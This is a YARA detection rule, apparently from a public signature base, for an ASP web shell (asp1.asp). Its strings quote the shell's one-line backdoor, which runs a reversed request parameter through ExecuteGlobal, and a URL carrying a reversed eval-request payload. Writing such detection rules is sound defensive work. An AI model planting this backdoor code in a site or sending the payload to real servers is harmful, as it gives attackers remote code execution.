rule webshell_webshells_new_asp1
{
	meta:
		description = "Web shells - generated from file asp1.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "b63e708cd58ae1ec85cf784060b69cad"
		os = "windows"
		filetype = "script"

	strings:
		$s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
		$s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword

	condition:
		1 of them
}
